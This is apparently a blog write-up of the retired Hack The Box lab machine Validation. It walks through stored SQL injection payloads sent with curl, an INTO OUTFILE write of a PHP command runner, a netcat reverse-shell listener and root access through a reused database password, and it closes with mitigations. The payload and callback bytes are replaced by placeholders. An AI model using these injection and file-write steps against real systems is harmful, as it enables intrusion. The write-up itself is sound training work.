---
title: "Hack The Box — Validation"
summary: "Validation turns a stored SQL injection into MySQL FILE abuse, a PHP web shell, a www-data foothold, and root through reused database credentials."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-09-02
publishedAt: 2026-09-02
tags:
  - web-security
  - sql-injection
  - mysql
  - information-schema
  - file-privilege
  - php-webshell
  - password-reuse
  - privilege-escalation
tools:
  - Nmap
  - curl
  - sed
  - Netcat
  - Bash
cves: []
htbUrl: "https://app.hackthebox.com/machines/Validation"
cover: "/images/writeups/hackthebox/machines/validation/validation.png"
coverAlt: "Hack The Box Validation machine artwork showing a reviewer holding a clipboard"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box machine Validation. Its retired status was reconfirmed on 2 September 2026 before publication. Flag values, VPN data, session cookies and personal identifiers have been removed. The credential shown later belongs only to this retired lab and is necessary to explain the privilege-escalation path.

## Introduction

Validation is an Easy Linux machine built around a short but instructive web-to-root chain. A registration form accepts a country value that later reaches a vulnerable SQL query. That stored input gives us a `UNION SELECT` primitive, metadata access through `information_schema`, and evidence that the application's MySQL account holds the global `FILE` privilege. Writing a small PHP command runner into the Apache document root converts the database flaw into command execution as `www-data`. The final escalation is not a kernel exploit: a database password stored in the PHP configuration is reused by the local `root` account.

This article follows my actual solve. Commands containing `<TARGET_IP>` or `<VPN_IP>` are faithful sanitized equivalents of what I ran. The two immediately executable command-execution payloads are represented by descriptive placeholders so the repository does not become a live webshell or reverse-shell artifact.

## Machine information

| Item | Value |
| --- | --- |
| Target | Validation |
| Platform | Hack The Box |
| Content type | Machine |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired |
| Solved | 2 September 2026 |

The official [Hack The Box Validation page](https://www.hackthebox.com/machines/validation) identifies the target as an Easy Linux machine and marks it as retired.

## Executive summary

I found four listening TCP services, with Apache on port 80 exposing a PHP registration application. The server trusted the submitted `country` value even though the UI presented it as a fixed dropdown. Injecting a `UNION SELECT` into that parameter and then loading `account.php` returned attacker-selected database results. I identified the `registration` schema, the effective MySQL account `uhc@localhost`, and its global privileges. Because the account held `FILE`, `SELECT ... INTO OUTFILE` wrote a PHP command runner into `/var/www/html`. That provided a reverse shell as `www-data`. Finally, `/var/www/html/config.php` disclosed the lab's database password, and password reuse allowed `su -` to reach `root`.

## Attack path

| Stage | Evidence | Result |
| --- | --- | --- |
| TCP enumeration | Four open ports, including Apache on 80 | Prioritized the PHP application |
| Form inspection | POST fields `username` and `country` | Identified the user-controlled attack surface |
| SQL injection | `UNION SELECT database()` rendered `registration` | Confirmed database result extraction |
| Privilege discovery | `USER_PRIVILEGES` output included `FILE` | Identified a server-side file-write path |
| Webshell | PHP written with `INTO OUTFILE` | Command execution as `www-data` |
| Reverse shell | Callback to Netcat on port 4444 | Foothold in `/var/www/html` |
| Local enumeration | Credentials in `config.php` | Found the MySQL password |
| Password reuse | `su -` accepted the database password | Root compromise |

## Environment setup

I worked from Kali over the HTB VPN. The examples omit the personal VPN address and session-specific target address:

```bash
export TARGET_IP='<TARGET_IP>'
export LHOST='<VPN_IP>'
```

The web workflow used separate cookie jars because the application associated each submitted registration with a `user` cookie before redirecting to `/account.php`.

## Initial enumeration

I started with a full TCP scan and default scripts plus version detection:

```bash
nmap "$TARGET_IP" -T5 -sVC -p-
```

The useful results were:

```text
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp   open  http  Apache httpd 2.4.48 (Debian)
4566/tcp open  http  nginx (403 Forbidden)
8080/tcp open  http  nginx (502 Bad Gateway)
```

The aggressive `-T5` timing caused Nmap to report that it had hit the retransmission cap, but the seven-minute scan still established the four listening ports required for the next step. Port 80 returned a real application, whereas the two nginx listeners returned error responses, so I moved to Apache.

## Web application enumeration

I inspected the registration controls instead of assuming that the visible dropdown was safe:

```bash
curl -s "http://$TARGET_IP/" \
  | grep -Ei 'form|input|select|option'
```

The relevant HTML was:

```html
<form action="#" method="Post">
  <input type="text" name="username" placeholder="Username">
  <select id="country" name="country">
    <option value="Brazil">Brazil</option>
    <!-- additional countries omitted -->
  </select>
</form>
```

The browser limits ordinary users to predefined countries, but HTTP clients are not bound by those options. Both fields remained attacker-controlled server inputs.

## Vulnerability discovery

### Extracting the active schema

I submitted a unique username and replaced the country with a single-column `UNION SELECT` payload:

```bash
curl -s -c schema.cookies \
  -X POST "http://$TARGET_IP/" \
  --data-urlencode 'username=schemacheck' \
  --data-urlencode "country=Brazil' UNION SELECT database()-- -" \
  > /dev/null

curl -s -b schema.cookies "http://$TARGET_IP/account.php" \
  | sed 's/<[^>]*>/\n/g' \
  | sed '/^[[:space:]]*$/d'
```

The important rendered value was:

```text
registration
```

The POST returned `302 Found`, set a `user` cookie and redirected to `/account.php`. Loading that page with the cookie caused the injected country to participate in the vulnerable query. This observed two-step behavior is consistent with stored, or second-order, SQL injection.

### Identifying the database account

I repeated the pattern with `CURRENT_USER()`:

```bash
curl -s -c dbuser.cookies \
  -X POST "http://$TARGET_IP/" \
  --data-urlencode 'username=dbusercheck' \
  --data-urlencode "country=Brazil' UNION SELECT CURRENT_USER()-- -" \
  > /dev/null

curl -s -b dbuser.cookies "http://$TARGET_IP/account.php" \
  | sed 's/<[^>]*>/\n/g' \
  | sed '/^[[:space:]]*$/d'
```

```text
uhc@localhost
```

This was the effective MySQL identity used by the PHP application, not Apache's Linux identity.

### Enumerating global privileges

MySQL's `information_schema.USER_PRIVILEGES` table represents each global privilege as a row associated with a `GRANTEE`. I grouped the application's privileges into one value that fit the existing output column:

```bash
curl -s -c privileges.cookies \
  -X POST "http://$TARGET_IP/" \
  --data-urlencode 'username=privcheck' \
  --data-urlencode "country=Brazil' UNION SELECT GROUP_CONCAT(PRIVILEGE_TYPE) FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=\"'uhc'@'localhost'\"-- -" \
  > /dev/null

curl -s -b privileges.cookies "http://$TARGET_IP/account.php" \
  | sed 's/<[^>]*>/\n/g' \
  | sed '/^[[:space:]]*$/d'
```

The long result included the decisive global privilege:

```text
SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,...,FILE,...,CREATE USER,...
```

`FILE` enables operations such as `LOAD_FILE()` and `SELECT ... INTO OUTFILE`, subject to operating-system permissions and `secure_file_priv`. On Validation, MySQL could write into Apache's document root, converting SQL injection into code execution.

## Initial foothold

### Writing a PHP command runner

I hex-encoded a minimal PHP runner to avoid shell expansion and nested-quote problems. The directly executable byte sequence is intentionally replaced here:

```bash
curl -s -c shell.cookies \
  -X POST "http://$TARGET_IP/" \
  --data-urlencode 'username=shellcheck' \
  --data-urlencode "country=Brazil' UNION SELECT <HEX_PHP_COMMAND_RUNNER> INTO OUTFILE '/var/www/html/validation-cmd.php'-- -" \
  > /dev/null
```

The public filename is also a sanitized equivalent of the personal filename used during the live solve.

### The first 404 and the missing trigger

My first request to the PHP path returned `404 Not Found`. The payload was valid; I had forgotten the second half of the application's execution flow. The POST only stored the registration and issued the cookie. I still had to load the account page with that cookie:

```bash
curl -s -b shell.cookies "http://$TARGET_IP/account.php" > /dev/null
```

After that trigger, the file existed. Supplying the benign `whoami` command confirmed the web-server identity:

```bash
curl -sG "http://$TARGET_IP/validation-cmd.php" \
  --data-urlencode 'cmd=whoami'
```

```text
www-data
```

The failure demonstrated that exploitation depended on the delayed `account.php` query rather than the registration POST itself.

### Receiving a reverse shell

I opened a listener on Kali:

```bash
nc -lvnp 4444
```

I then supplied a Bash callback through the PHP runner. The live callback is represented by a placeholder so the published Markdown is not itself a copy-paste shell payload:

```bash
curl -sG "http://$TARGET_IP/validation-cmd.php" \
  --data-urlencode "cmd=<BASH_CALLBACK_TO_$LHOST:4444>"
```

The listener received the connection:

```text
connect to [<VPN_IP>] from (UNKNOWN) [<TARGET_IP>] 45720
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$
```

Basic checks established the security context:

```bash
whoami
id
hostname
pwd
```

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
validation
/var/www/html
```

## Internal enumeration

### Shell stabilization attempts

The common Python PTY technique failed because Python 3 was not installed:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```text
bash: python3: command not found
```

Setting `TERM` worked as an environment change, but `stty` could not operate on the raw Netcat input:

```bash
export TERM=xterm
stty rows 40 columns 120
```

```text
stty: 'standard input': Inappropriate ioctl for device
```

I kept the basic shell and continued rather than claiming it had been stabilized.

### User-level completion

The home directory contained one user directory and the user proof file:

```bash
cd /home/htb
ls
```

```text
user.txt
```

I submitted the proof to HTB; its value is intentionally omitted.

## Privilege escalation

The application directory was the most relevant place to search for database configuration and reused secrets:

```bash
cd /var/www/html
grep -RniE 'password|passwd|mysqli|mysql|PDO' . 2>/dev/null
cat config.php
```

The configuration contained:

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

This credential belongs exclusively to the retired lab and is included because password reuse is the complete root cause of the final escalation. I tested it against the local root account:

```bash
su -
```

The password was accepted. Verification returned:

```bash
whoami
id
```

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

`/root/root.txt` was now accessible. I submitted the proof and omitted its value here.

## What did not work

| Attempt | Observed result | Adjustment |
| --- | --- | --- |
| `-T5` full-port scan | Retransmission-cap warning and a long scan | Retained confirmed ports and focused on port 80 |
| Requesting PHP immediately after POST | `404 Not Found` | Loaded `/account.php` with the cookie to trigger the stored injection |
| Python PTY upgrade | `python3: command not found` | Continued with the basic Bash shell |
| Manual `stty` sizing | `Inappropriate ioctl for device` | Avoided claiming a stabilized TTY |

## Key takeaways

- A `<select>` element is a browser-side convenience, not a server-side security boundary.
- Registration stored the payload, while `account.php` executed it in a later SQL context.
- `CURRENT_USER()` and `information_schema.USER_PRIVILEGES` established identity and capability before file writes.
- The MySQL account held privileges far beyond a registration application's needs. `FILE` converted SQL injection into operating-system command execution.
- The initial 404 did not disprove the payload. Reconstructing the state transition exposed the missing trigger.
- Privilege escalation came from password reuse, not a sophisticated local exploit.

## Mitigations

| Weakness | Defensive action |
| --- | --- |
| SQL injection in `country` | Use parameterized queries and server-side allow-list validation |
| Delayed use of stored input | Treat persisted data as untrusted whenever it re-enters an interpreter context |
| Excessive MySQL grants | Use a dedicated least-privileged account and remove global privileges such as `FILE`, `SUPER` and `CREATE USER` |
| File creation in the webroot | Configure `secure_file_priv`, isolate database filesystem access and prevent MySQL from writing executable web content |
| PHP command execution | Monitor unexpected PHP files and child processes spawned by the web server |
| Credentials in configuration | Use protected secret management and restrictive file permissions |
| Password reuse | Generate independent credentials for the database and every operating-system account |

## Tools used

| Tool | Purpose |
| --- | --- |
| Nmap | Full TCP, service and version enumeration |
| curl | Form inspection, cookie handling, SQLi delivery and web interaction |
| grep / sed | Focused extraction from HTML and command output |
| MySQL functions | Schema, current-user and privilege discovery |
| Netcat | Reverse-shell listener |
| Bash | Callback shell and local enumeration |

## References

- [Hack The Box — Validation](https://www.hackthebox.com/machines/validation)
- [MySQL: The INFORMATION_SCHEMA USER_PRIVILEGES Table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-user-privileges-table.html)
- [MySQL: Privileges Provided by MySQL](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html)
- [MySQL: SELECT ... INTO Statement](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Return to the write-ups archive](/writeups/)
